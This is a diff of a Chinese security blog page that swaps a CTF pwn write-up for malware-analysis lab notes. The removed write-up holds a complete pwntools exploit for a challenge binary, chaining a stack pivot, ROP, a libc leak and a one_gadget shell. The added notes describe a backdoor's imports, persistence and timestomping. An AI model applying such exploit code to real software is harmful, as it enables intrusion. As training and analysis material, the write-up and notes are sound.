@@ -4,8 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="linux 64位万能gadget &amp; 栈迁移 &amp; rop, 时钟">
-    <meta name="description" content="linux 64位万能gadget &amp;amp; 栈迁移 &amp;amp; rop用一个例题(下面有题目链接)为例子，下面是它的关键函数：最后一个read函数存在溢出，但是由于溢出的长度有限因而不能够实现利用，同时第一个read函数可以向bss段读">
+    <meta name="keywords" content="恶意代码分析 lab-9.1, 时钟">
+    <meta name="description" content="
+恶意代码逆向这个东西复杂的要死，细节很多，我只写了自己关注的部分，这文章主要当做笔记给自己看的，写的不是很详细。
+
+恶意代码分析 lab-9.1对于windows的恶意代码，导入函数起到非常大的作用，下面是改程序的：
+Address  O">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>linux 64位万能gadget &amp; 栈迁移 &amp; rop | 时钟</title>
+    <title>恶意代码分析 lab-9.1 | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -239,13 +243,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        linux 64位万能gadget &amp; 栈迁移 &amp; rop
+                        恶意代码分析 lab-9.1
                     </div>
                 </div>
             </div>
@@ -356,8 +360,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/" target="_blank">
-                                <span class="chip bg-color">pwn</span>
+                            <a href="/tags/reverse/" target="_blank">
+                                <span class="chip bg-color">reverse</span>
                             </a>
                         
                     </div>
@@ -368,8 +372,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
-                                CTF题解
+                            <a href="/categories/逆向工程/" class="post-category" target="_blank">
+                                逆向工程
                             </a>
                         
                     </div>
@@ -380,21 +384,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-15
+                    2020-02-14
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        570
+                        909
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        4 分
                     </div>
                     
                 
@@ -410,63 +414,131 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="linux-64位万能gadget-amp-栈迁移-amp-rop"><a href="#linux-64位万能gadget-amp-栈迁移-amp-rop" class="headerlink" title="linux 64位万能gadget &amp; 栈迁移 &amp; rop"></a>linux 64位万能gadget &amp; 栈迁移 &amp; rop</h1><p>用一个例题(下面有题目链接)为例子，下面是它的关键函数：<br><img src="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/1.png" title="This is an image"><br>最后一个read函数存在溢出，但是由于溢出的长度有限因而不能够实现利用，同时第一个read函数可以向bss段读入超长数据，自然想到了栈迁移，但是我们看下保护。</p>
-<pre><code>[*] &#39;/home/root0/pratice/pwn/pwn50&#39;
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-</code></pre><p>NX开了，而且bss段没有可执行权限，那么我们不能向bss段读入shellcode，那么我们就可以利用rop技术，但是程序不大，所以用ROGgadget不能够找到合适的gadget段，但是，对于64位linux程序，只要调用了libc.so，那么就会有通用的gadget。</p>
-<h3 id="万能gadget-libc-csu-init"><a href="#万能gadget-libc-csu-init" class="headerlink" title="万能gadget :__libc_csu_init()"></a>万能gadget :<strong>__libc_csu_init()</strong></h3><img src="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/2.png" title="This is an image">
-<p>从0x40068A这里开始,rbx,rbp,r12,13,r14,r15，都会布置好，最后的哪个 。。。下面引用先知上一个大佬的文章，写的很详细。</p>
-<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>其实简单的说就是控制执行两次leave_ret ，栈里面把ebp/rbp的值改成目的址-8，就可以了,同时，可能比较疑惑的一点是bss段没有可执行权限，如果有权限的话就可以直接读入shellcode来实现getshell，由于没有权限的原因，我们只能采用rop的方式来进行控制，因为rop和bss段是否有执行权限无关。<br>这个题目的脚本可以用来了解一下，同时下面有个参考链接。</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
-<span class="token comment" spellcheck="true"># coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
-context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
-r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn50'</span><span class="token punctuation">)</span>
-pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400693</span>
-leave_ret <span class="token operator">=</span> <span class="token number">0x00000000040060F</span>
-bss_addr <span class="token operator">=</span> <span class="token number">0x000000000601060</span>  <span class="token operator">+</span> <span class="token number">0x400</span>
-puts_ret_addr <span class="token operator">=</span> <span class="token number">0x601378</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn50"</span><span class="token punctuation">)</span>
-puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_plt <span class="token operator">=</span> <span class="token number">0x0000000004004C0</span>
-main_addr <span class="token operator">=</span> <span class="token number">0x00000000040061D</span>
-rop <span class="token operator">=</span> <span class="token punctuation">[</span>
-    pop_rdi_ret<span class="token punctuation">,</span>
-    puts_got<span class="token punctuation">,</span>
-    puts_plt<span class="token punctuation">,</span>
-    main_addr<span class="token punctuation">,</span>
-<span class="token punctuation">]</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bss:\n'</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">792</span> <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">232</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"stack:\n"</span><span class="token punctuation">)</span>
-offset <span class="token operator">=</span> <span class="token number">10</span>
-payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> 
-<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00\x00"</span><span class="token punctuation">)</span>
-libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
-libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
-system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
-one_gad_get <span class="token operator">=</span> <span class="token number">0x4526a</span> <span class="token operator">+</span> libcbase
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bss:\n"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span> <span class="token string">"libcbase =====> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>
-<span class="token keyword">print</span> <span class="token string">"system_addr =====> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"stack:\n"</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token number">-0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gad_get<span class="token punctuation">)</span> 
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<blockquote>
-<p><a href="https://xz.aliyun.com/t/5597" target="_blank" rel="noopener">https://xz.aliyun.com/t/5597</a>   万能gadget<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a>  栈迁移</p>
-<p>链接：<a href="https://pan.baidu.com/s/1OHPtwBpxynOIOvT1bwYSZw" target="_blank" rel="noopener">https://pan.baidu.com/s/1OHPtwBpxynOIOvT1bwYSZw</a><br>提取码：yxce</p>
+                <blockquote>
+<p>恶意代码逆向这个东西复杂的要死，细节很多，我只写了自己关注的部分，这文章主要当做笔记给自己看的，写的不是很详细。</p>
 </blockquote>
+<h2 id="恶意代码分析-lab-9-1"><a href="#恶意代码分析-lab-9-1" class="headerlink" title="恶意代码分析 lab-9.1"></a>恶意代码分析 lab-9.1</h2><p>对于windows的恶意代码，导入函数起到非常大的作用，下面是改程序的：</p>
+<pre><code>Address  Ordinal Name                      Library 
+-------  ------- ----                      ------- 
+0040B000         OpenSCManagerA            ADVAPI32
+0040B004         OpenServiceA              ADVAPI32
+0040B008         ChangeServiceConfigA      ADVAPI32
+0040B00C         CloseServiceHandle        ADVAPI32
+0040B010         CreateServiceA            ADVAPI32
+0040B014         RegDeleteValueA           ADVAPI32
+0040B018         RegCreateKeyExA           ADVAPI32
+0040B01C         RegSetValueExA            ADVAPI32
+0040B020         RegOpenKeyExA             ADVAPI32
+0040B024         RegQueryValueExA          ADVAPI32
+0040B028         DeleteService             ADVAPI32
+0040B030         ExpandEnvironmentStringsA KERNEL32
+0040B034         CopyFileA                 KERNEL32
+0040B038         GetModuleFileNameA        KERNEL32
+0040B03C         GetShortPathNameA         KERNEL32
+0040B040         Sleep                     KERNEL32
+0040B044         WriteFile                 KERNEL32
+0040B048         ReadFile                  KERNEL32
+0040B04C         GetLastError              KERNEL32
+0040B050         GetSystemDirectoryA       KERNEL32
+0040B054         CreateFileA               KERNEL32
+0040B058         GetFileTime               KERNEL32
+0040B05C         SetFileTime               KERNEL32
+0040B060         DeleteFileA               KERNEL32
+0040B064         CloseHandle               KERNEL32
+0040B068         CompareStringW            KERNEL32
+0040B06C         CompareStringA            KERNEL32
+0040B070         CreateProcessA            KERNEL32
+0040B074         GetFileAttributesA        KERNEL32
+0040B078         FlushFileBuffers          KERNEL32
+0040B07C         LoadLibraryA              KERNEL32
+0040B080         GetProcAddress            KERNEL32
+0040B084         LCMapStringW              KERNEL32
+0040B088         LCMapStringA              KERNEL32
+0040B08C         VirtualAlloc              KERNEL32
+0040B090         SetFilePointer            KERNEL32
+0040B094         GetStringTypeW            KERNEL32
+0040B098         ExitProcess               KERNEL32
+0040B09C         TerminateProcess          KERNEL32
+0040B0A0         GetCurrentProcess         KERNEL32
+0040B0A4         GetTimeZoneInformation    KERNEL32
+0040B0A8         GetSystemTime             KERNEL32
+0040B0AC         GetLocalTime              KERNEL32
+0040B0B0         DuplicateHandle           KERNEL32
+0040B0B4         GetCommandLineA           KERNEL32
+0040B0B8         GetVersion                KERNEL32
+0040B0BC         SetStdHandle              KERNEL32
+0040B0C0         GetFileType               KERNEL32
+0040B0C4         SetHandleCount            KERNEL32
+0040B0C8         GetStdHandle              KERNEL32
+0040B0CC         GetStartupInfoA           KERNEL32
+0040B0D0         CreatePipe                KERNEL32
+0040B0D4         GetExitCodeProcess        KERNEL32
+0040B0D8         WaitForSingleObject       KERNEL32
+0040B0DC         HeapReAlloc               KERNEL32
+0040B0E0         HeapAlloc                 KERNEL32
+0040B0E4         GetCPInfo                 KERNEL32
+0040B0E8         GetACP                    KERNEL32
+0040B0EC         GetOEMCP                  KERNEL32
+0040B0F0         UnhandledExceptionFilter  KERNEL32
+0040B0F4         FreeEnvironmentStringsA   KERNEL32
+0040B0F8         FreeEnvironmentStringsW   KERNEL32
+0040B0FC         WideCharToMultiByte       KERNEL32
+0040B100         GetEnvironmentStrings     KERNEL32
+0040B104         GetEnvironmentStringsW    KERNEL32
+0040B108         GetModuleHandleA          KERNEL32
+0040B10C         GetEnvironmentVariableA   KERNEL32
+0040B110         GetVersionExA             KERNEL32
+0040B114         HeapDestroy               KERNEL32
+0040B118         HeapCreate                KERNEL32
+0040B11C         VirtualFree               KERNEL32
+0040B120         HeapFree                  KERNEL32
+0040B124         RtlUnwind                 KERNEL32
+0040B128         MultiByteToWideChar       KERNEL32
+0040B12C         GetStringTypeA            KERNEL32
+0040B130         SetEnvironmentVariableA   KERNEL32
+0040B138         ShellExecuteA             SHELL32 
+0040B140 22      shutdown                  WS2_32  
+0040B144 115     WSAStartup                WS2_32  
+0040B148 52      gethostbyname             WS2_32  
+0040B14C 19      send                      WS2_32  
+0040B150 23      socket                    WS2_32  
+0040B154 9       htons                     WS2_32  
+0040B158 4       connect                   WS2_32  
+0040B15C 3       closesocket               WS2_32  
+0040B160 16      recv                      WS2_32  
+0040B164 116     WSACleanup                WS2_32  
+</code></pre><p>对于dll大致分析：</p>
+<pre><code>Advapi32.dll            ====&gt;  Windows组件访问，如服务管理器和注册表
+Kernel32.dll             ===&gt;  包含系统核心功能，访问操作内存，文件，硬件等；
+Wsock32.dll和Ws2_32.dll               ===&gt;这两个是联网DLL，访问其中任何一个DLL的程序非常可能链接网络，或者是执行网络相关任务
+</code></pre><p>可以大致分析出这个程序会操作注册表，服务，执行一些网络行为，伴随着一些文件操作。</p>
+<p>这个程序的代码量实在是庞大，所以就不贴代码了，说下主要功能：</p>
+<ol>
+<li><p>首先程序有个密码验证功能，如果没有正确密码输入，它在执行的时候会删除自身，这可能是程序为了防止被发现，因为这是个后门程序。</p>
+</li>
+<li><p>对于密码的修补就可以用让参数验证函数一直返回1就可以了，给程序打个补丁。</p>
+</li>
+<li><p>它命令行参数有-in  -re  -c -cc 四个选项，对应这不同功能。</p>
+</li>
+<li><p>-in如下 ， 这是个安装程序，注册表和服务同时操作，这一波也稍微明白可windows安装包内部是怎么操作的了。。。注册表和服务会使得这个程序实现自启动，这是后门常用的计俩了。</p>
+</li>
+<li><pre><code>.text:00402B89 loc_402B89:                             ; CODE XREF: _main+8Fj
+.text:00402B89                 lea     edx, [ebp+ServiceName]
+.text:00402B8F                 push    edx             ; lpServiceName
+.text:00402B90                 call    sub_402600
+.text:00402B95                 add     esp, 4
+.text:00402B98                 jmp     short loc_402BC2
+</code></pre></li>
+</ol>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><pre><code>mov     edi, [ebp+lpServiceName]
+lea     edx, [ebp+DisplayName]
+or      ecx, 0FFFFFFFFh
+xor     eax, eax
+repne scasb
+</code></pre><p>类似于上述的代码可以当做strcmp , strcpy , strcat 之类的代码反汇编，一开始还真没看出来。</p>
+<p>windows恶意代码在system32这里面有时间戳相关技术来实现与kernel32.dll之类的保持一致，被称为timestomping技术。</p>
+<p>值得注意的是如果你用od打开，即是没有参数程序也不会被删除，因为此时windows系统不允许删除这个文件。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于windows 恶意程序，静态分析想要得出完善的程序流程几乎不可能，我们应该以静态获得大致流程，以动态获得程序细节。</p>
 
             </div>
             <hr>
@@ -498,9 +570,9 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《linux 64位万能gadget &amp; 栈迁移 &amp; rop》
+                    《恶意代码分析 lab-9.1》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/14/e-yi-dai-ma-fen-xi-lab-9-1/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -541,46 +613,50 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/01/30/pwnablele-exercises/">
+                <a href="/2020/02/14/e-yi-dai-ma-fen-xi-lab-9-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="pwnablele_exercises">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="恶意代码分析 lab-9.1">
                         
-                        <span class="card-title">pwnablele_exercises</span>
+                        <span class="card-title">恶意代码分析 lab-9.1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            pwnable.tw不愧是誉为pwn手最爱的平台，题目很难，但是每一个题目都十分具有代表性，一句话：快乐很多，知识很多，哈哈！
-3x17首先这是一个64位的elf文件，check结果如下：
-[*] &#39;/home/root0/prat
+                            
+恶意代码逆向这个东西复杂的要死，细节很多，我只写了自己关注的部分，这文章主要当做笔记给自己看的，写的不是很详细。
+
+恶意代码分析 lab-9.1对于windows的恶意代码，导入函数起到非常大的作用，下面是改程序的：
+Address  O
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
-                                    CTF题解
+                            <a href="/categories/逆向工程/" class="post-category" target="_blank">
+                                    逆向工程
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/" target="_blank">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/tags/reverse/" target="_blank">
+                        <span class="chip bg-color">reverse</span>
                     </a>
                     
                 </div>
@@ -594,25 +670,29 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/01/11/2019xman-ru-ying-sai/">
+                <a href="/2020/02/13/large-bin-attack/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="2019XMAN冬令营入营赛">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="large bin attack">
                         
-                        <span class="card-title">2019XMAN冬令营入营赛</span>
+                        <span class="card-title">large bin attack</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2019XMAN入营赛XMAN训练营的题目，还是能学到不少东西的，就拿来看了看。
-babyarm这个题目并不难，难在于它是一个arm的架构，所以难以调试，不过从出题人哪里得到一个很好的github项目arm_now，但是我看了看还是没办法用
+                            放三个例题，自己写的很麻烦，调试了一天，raycp师傅的脚本就思路很清晰，羡慕。
+0ctf2018-heapstorm2    add(0x28)   #0
+
+    add(0xa90)  #1
+    add(0x80)   #2
+  
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-11
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-13
                             </span>
                         <span class="publish-author">
                             
